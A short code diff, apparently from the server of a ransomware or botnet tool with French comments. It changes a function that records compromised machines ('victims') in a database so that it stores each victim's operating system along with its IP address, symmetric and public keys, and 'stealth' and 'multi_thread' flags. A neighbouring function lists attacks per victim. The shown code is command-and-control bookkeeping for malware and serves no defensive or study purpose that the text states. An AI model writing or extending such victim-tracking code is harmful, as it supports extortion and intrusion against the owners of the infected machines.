@@ -89,7 +89,7 @@ def get_victim_attacks(mycursor):
     return attacks
 
 
-def add_victim_to_db(db, mycursor, uid, ip, sym_key, pub_key):
+def add_victim_to_db(db, mycursor, uid, os, ip, sym_key, pub_key):
     # Vérification de l'uid dans la base de données
     query = "SELECT * FROM victims WHERE uid = %s"
     values = (uid,)
@@ -101,16 +101,16 @@ def add_victim_to_db(db, mycursor, uid, ip, sym_key, pub_key):
     #Update du client en bdd
     if len(myresult) > 0:
         # print("client already in the database")
-        query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
-        values = (ip, base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
+        query = "UPDATE victims SET ip = %s, os = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
+        values = (ip, os, base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
 
         mycursor.execute(query, values)
 
     #Insert du client en bdd
     else:
         # print("client not in the database")
-        query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
-        values = (uid, ip, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
+        query = "INSERT INTO victims (uid, ip, os, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s, %s)"
+        values = (uid, ip, os, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
 
         mycursor.execute(query, values)
 
